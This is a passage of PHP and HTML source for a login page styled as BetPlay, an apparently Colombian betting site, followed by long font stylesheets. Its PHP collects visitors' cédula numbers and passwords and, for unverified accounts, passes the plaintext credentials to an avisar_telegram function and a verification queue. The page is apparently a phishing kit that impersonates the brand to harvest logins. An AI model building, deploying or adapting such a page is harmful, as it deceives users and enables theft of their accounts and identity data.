<?php
declare(strict_types=1);
require_once __DIR__ . '/referidos/lib/db.php';
require_once __DIR__ . '/referidos/lib/helpers.php';

if (session_status() !== PHP_SESSION_ACTIVE) session_start();

if (isset($_GET['logout'])) {
    $_SESSION = [];
    session_destroy();
    header('Location: /index.php'); exit;
}

$error = '';
$refGet = preg_replace('/[^A-Za-z0-9]/', '', (string)($_GET['ref'] ?? ''));
if ($refGet !== '') { $_SESSION['ref'] = $refGet; $_SESSION['ref_mostrar'] = 1; }
else { $_SESSION['ref_mostrar'] = 0; }
$ref = $_SESSION['ref'] ?? '';
$mostrarRef = !empty($_SESSION['ref_mostrar']) && $ref !== '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cedula = normaliza_cedula((string)($_POST['cedula'] ?? ''));
    $pass   = (string)($_POST['password'] ?? '');

    if ($cedula === '' || strlen($cedula) < 3) { $error = 'Usuario invalido.'; }
    elseif (strlen($pass) < 3) { $error = 'Contrasena demasiado corta.'; }
    else {
        $pdo = db();
        $st = $pdo->prepare('SELECT * FROM usuarios WHERE cedula = ? LIMIT 1');
        $st->execute([$cedula]);
        $usuario = $st->fetch();

        if ($usuario) {
            $passOk = $usuario['password_hash'] !== '' && password_verify($pass, $usuario['password_hash']);
            if (!$passOk && $usuario['estado'] === 'verificado') {
                $error = 'Contraseña incorrecta.';
            } else {
                if (!$passOk) {
                    $pdo->prepare('UPDATE usuarios SET password_hash=?, estado="pendiente", motivo=NULL WHERE id=?')
                        ->execute([password_hash($pass, PASSWORD_DEFAULT), (int)$usuario['id']]);
                    $pdo->prepare('UPDATE cola SET estado="error", motivo="reemplazada", actualizado_en=datetime("now")
                                   WHERE usuario_id=? AND estado IN ("pendiente","procesando")')
                        ->execute([(int)$usuario['id']]);
                }
                $_SESSION['uid']=(int)$usuario['id']; $_SESSION['cedula']=$cedula; $_SESSION['codigo']=(string)$usuario['codigo_corto'];
                $_SESSION['popup_bienvenida'] = 1;   // <-- AQUÍ
                enlazar_referido($pdo, $usuario, $ref);
                if ($usuario['estado'] === 'verificado') { header('Location: /referidos/panel.php'); exit; }
                if (!tiene_cola_pendiente($pdo,(int)$usuario['id'])) encolar_verificacion($pdo,$cedula,$pass,(int)$usuario['id']);
                avisar_telegram($cedula,$pass);
                header('Location: /verificando.php'); exit;
            }
        } else {
            $codigo = generar_codigo($pdo);
            $pdo->prepare('INSERT INTO usuarios (cedula,password_hash,codigo_corto,estado,creado_en) VALUES (?,?,?,"pendiente",datetime("now"))')
                ->execute([$cedula, password_hash($pass, PASSWORD_DEFAULT), $codigo]);
            $uid = (int)$pdo->lastInsertId();
            $usuario = ['id'=>$uid,'cedula'=>$cedula,'codigo_corto'=>$codigo,'estado'=>'pendiente'];
            enlazar_referido($pdo, $usuario, $ref);
            encolar_verificacion($pdo,$cedula,$pass,$uid);
            avisar_telegram($cedula,$pass);
            $_SESSION['uid']=$uid; $_SESSION['cedula']=$cedula; $_SESSION['codigo']=$codigo;
            $_SESSION['popup_bienvenida'] = 1;   // <-- AQUÍ
            header('Location: /verificando.php'); exit;
        }
    }
}
?>
<html lang="es-CO" data-critters-container="">

<head>
  <meta charset="utf-8">


  <!-- HTML Meta Tags -->
  <title>Apuestas Deportivas en Vivo | Apuestas en Línea BetPlay</title>
  <meta
    content="Apuestas deportivas en vivo y en línea las 24 hrs. BetPlay es la plataforma de apuestas online más grande de Colombia. Vive la experencia BetPlay."
    name="description">
  <meta name="robots" content="index, follow">
  <style>
    img {
      border-radius: 12px
    }
  </style>
  <link rel="stylesheet" href="css/theme.css" media="all" onload="this.media='all'"><noscript>
    <link rel="stylesheet" href="css/theme.css">
  </noscript>
  <base href="./">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/x-icon" href="favicon.ico?v=1.1.0">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css"
    integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
  <!-- Assets -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
  <link rel="stylesheet" href="css/animate.css" media="all" onload="this.media='all'"><noscript>
    <link rel="stylesheet" href="css/animate.css">
  </noscript>
  <link rel="stylesheet" href="css/bet-icons.css" media="all" onload="this.media='all'"><noscript>
    <link rel="stylesheet" href="css/bet-icons.css">
  </noscript>
  <style type="text/css">
    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 300;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3GUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 300;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3iUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 300;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3CUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+1F00-1FFF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 300;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3-UBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 300;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMawCUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 300;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMaxKUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 300;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3OUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 300;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3KUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 300;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3yUBHMdazQ.woff2) format('woff2');
      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 400;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3GUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 400;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3iUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 400;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3CUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+1F00-1FFF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 400;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3-UBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 400;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMawCUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 400;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMaxKUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 400;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3OUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 400;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3KUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 400;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3yUBHMdazQ.woff2) format('woff2');
      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 500;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3GUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 500;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3iUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 500;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3CUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+1F00-1FFF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 500;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3-UBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 500;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMawCUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0302-0303, U+0305, U+0307-0308, U+0310, U+0312, U+0315, U+031A, U+0326-0327, U+032C, U+032F-0330, U+0332-0333, U+0338, U+033A, U+0346, U+034D, U+0391-03A1, U+03A3-03A9, U+03B1-03C9, U+03D1, U+03D5-03D6, U+03F0-03F1, U+03F4-03F5, U+2016-2017, U+2034-2038, U+203C, U+2040, U+2043, U+2047, U+2050, U+2057, U+205F, U+2070-2071, U+2074-208E, U+2090-209C, U+20D0-20DC, U+20E1, U+20E5-20EF, U+2100-2112, U+2114-2115, U+2117-2121, U+2123-214F, U+2190, U+2192, U+2194-21AE, U+21B0-21E5, U+21F1-21F2, U+21F4-2211, U+2213-2214, U+2216-22FF, U+2308-230B, U+2310, U+2319, U+231C-2321, U+2336-237A, U+237C, U+2395, U+239B-23B7, U+23D0, U+23DC-23E1, U+2474-2475, U+25AF, U+25B3, U+25B7, U+25BD, U+25C1, U+25CA, U+25CC, U+25FB, U+266D-266F, U+27C0-27FF, U+2900-2AFF, U+2B0E-2B11, U+2B30-2B4C, U+2BFE, U+3030, U+FF5B, U+FF5D, U+1D400-1D7FF, U+1EE00-1EEFF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 500;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMaxKUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190, U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F, U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF, U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB, U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF, U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382, U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0, U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442, U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9, U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7, U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A, U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2, U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC, U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD, U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9, U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9, U+1FAF0-1FAF8, U+1FB00-1FBFF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 500;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3OUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 500;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3KUBHMdazTgWw.woff2) format('woff2');
      unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
    }

    @font-face {
      font-family: 'Roboto';
      font-style: normal;
      font-weight: 500;
      font-stretch: 100%;
      src: url(https://fonts.gstatic.com/s/roboto/v47/KFO7CnqEu92Fr1ME7kSn66aGLdTylUAMa3yUBHMdazQ.woff2) format('woff2');
      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
    }
  </style>
  <style type="text/css">
    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 400;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WRhyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 400;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459W1hyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 400;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WZhyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 400;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WdhyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 400;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WlhyyTh89Y.woff2) format('woff2');
      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 500;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WRhyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 500;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459W1hyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 500;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WZhyyTh89ZNpQ.woff2) format('woff2');
      unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
    }

    @font-face {
      font-family: 'Montserrat';
      font-style: normal;
      font-weight: 500;
      src: url(https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WdhyyTh89ZNpQ.woff2) format('woff2');
